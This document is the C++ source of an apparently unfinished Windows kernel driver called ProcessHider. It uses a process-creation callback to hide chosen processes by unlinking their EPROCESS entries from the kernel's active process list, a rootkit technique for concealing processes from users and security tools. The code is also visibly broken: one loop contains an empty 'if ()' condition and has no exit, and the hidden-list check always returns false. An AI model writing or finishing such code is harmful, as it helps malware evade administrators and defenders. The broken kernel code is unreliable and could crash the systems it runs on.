#include "ProcessHider.h"

#include <ntddk.h>

#pragma warning( disable : 4302 4311 )

namespace filter
{

	NTSTATUS ProcessHider::Register()
	{
		ProcessHider::HideOnInitializeOperation();
		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);

		if (!NT_SUCCESS(status)) 
		{
			ProcessHider::Unload();
		}

		KeInitializeGuardedMutex(&process_lock_);

		return status;
	}

	void ProcessHider::Unload()
	{
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
	}

	bool ProcessHider::GetShortName(PWCHAR short_name, int size, PUNICODE_STRING long_name)
	{
		int long_name_size = long_name->Length / 2;
		int ans = -1;
		for (int i = long_name_size - 1; i >= 0; i--)
		{
			if (long_name->Buffer[i] == WCHAR(L'\\'))
			{
				ans = i;
				break;
			}
		}

		int mem_size = (long_name_size - (ans + 1)) * 2;
		if (mem_size > size)
		{
			return false;
		}
		RtlCopyMemory(short_name, &long_name->Buffer[ans + 1], mem_size);
		return true;
	}

	bool ProcessHider::GetShortNameByPid(PWCHAR short_name, int size, HANDLE pid)
	{
		PEPROCESS eprocess;
		PUNICODE_STRING process_name;
		bool ret;
		if (PsLookupProcessByProcessId(pid, &eprocess) != STATUS_SUCCESS)
		{
			return false;
		}
		if (SeLocateProcessImageName(eprocess, &process_name) != STATUS_SUCCESS)
		{
			return false;
		}
		
		ret = GetShortName(short_name, size, process_name);

		ExFreePool(process_name->Buffer);

		return ret;

	}

	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
	{
		return false;
	}

	void ProcessHider::HideOnInitializeOperation()
	{
		WCHAR process_name[MAX_SIZE];
		HANDLE last_pid;
		PLIST_ENTRY next_p_list_entry_eprocess;

		P_CUSTOM_EPROCESS cur_p_eprocess = NULL, next_p_eprocess = NULL;
		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
		{
			return;
		}

		last_pid = (HANDLE)SYSTEM_PID;

		while (true)
		{
			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);

			if (GetShortNameByPid(process_name, MAX_SIZE, cur_p_eprocess->UniqueProcesId) == true)
			{
				if (IsProcessInHiddenList(process_name))
				{

				}
			}
			if ()
		}
	}

	void ProcessHider::HideOnCreateOperation(P_CUSTOM_EPROCESS peprocess, HANDLE pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		WCHAR msg[MAX_SIZE] = { 0 };
		WCHAR name[MAX_SIZE] = { 0 };

		if (create_info != NULL)
		{
			PUNICODE_STRING process_name = (PUNICODE_STRING)create_info->ImageFileName;
			
			if (GetShortName(name, MAX_SIZE, process_name) == false)
			{
				return;
			}

			DebugMessage("Process created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);

			if (IsProcessInHiddenList(name))
			{
				bool status = false;

				status = HideProcess(peprocess);

				if (status == true)
				{
					DebugMessage("Hide oke");
				}
			}
		}
	}


	bool ProcessHider::HideProcess(P_CUSTOM_EPROCESS peprocess)
	{

		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;

		KeAcquireGuardedMutex(&process_lock_);

		cur_p_eprocess = peprocess;

		pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
		next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
		pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
		next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
		
		cur_p_eprocess->ActiveProcessLinks.Blink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
		cur_p_eprocess->ActiveProcessLinks.Flink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);

		KeReleaseGuardedMutex(&process_lock_);

		return true;
	}

}
